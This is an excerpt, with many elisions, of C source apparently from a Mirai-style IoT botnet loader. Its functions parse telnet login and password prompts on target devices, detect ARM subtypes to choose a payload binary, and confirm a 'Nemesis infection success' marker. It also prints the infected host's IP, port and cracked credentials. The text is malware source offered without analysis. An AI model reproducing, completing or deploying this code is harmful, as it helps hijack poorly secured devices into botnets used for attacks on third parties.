...
void connection_close(struct connection *conn)
{
    ...
    if(conn->open)
    {
        ...
        if(conn->success)
        {
            ...
            fprintf(stderr, "\033[1;32mComing Senpai \033[1;35m----\033[1;36m>\033[1;32m \033[1;36m[\033[1;32m%d.%d.%d.%d:%d\033[1;36m] [\033[1;32m%s:%s\033[1;36m] [\033[1;32m%s\033[1;36m]\n\033[0m",
...
int connection_consume_login_prompt(struct connection *conn)
{
    ...
    {
        if(conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%' || conn->rdbuf[i] == '[' || conn->rdbuf[i] == ']' || conn->rdbuf[i] == '~')
        {
            #ifdef DEBUG
    ...
    if(prompt_ending == -1)
    {
        ...
        if((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
            ...
            prompt_ending = tmp;
		else if((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ser", 3)) != -1)
            prompt_ending = tmp;
        else if((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ccount", 6)) != -1)
            prompt_ending = tmp;
    }
...
int connection_consume_password_prompt(struct connection *conn)
{
    ...
    if(prompt_ending == -1)
    {
        ...
        if((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
            prompt_ending = tmp;
		else if((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ass", 3)) != -1)
            prompt_ending = tmp;
    }
...
int connection_consume_arm_subtype(struct connection *conn)
{
	...
	else if(util_memsearch(conn->rdbuf, offset, "ARMv6", 5) != -1)
	{
	#ifdef DEBUG
        printf("[FD%d] Arch has ARMv6!\n", conn->fd);
#endif
        strcpy(conn->info.arch, "arm6");
	}
	else if(util_memsearch(conn->rdbuf, offset, "ARMv5", 5) != -1)
	{
	#ifdef DEBUG
        printf("[FD%d] Arch has ARMv5!\n", conn->fd);
#endif
        strcpy(conn->info.arch, "arm5");
	}
...
int connection_verify_payload(struct connection *conn)
{
    ...
    if(offset == -1)
        return 0;
    char msg[200];
	sprintf(msg,"Nemesis infection success.");
    if(util_memsearch(conn->rdbuf, offset, msg, strlen(msg)) == -1)
        return offset;
    else
        return 255 + offset;
}
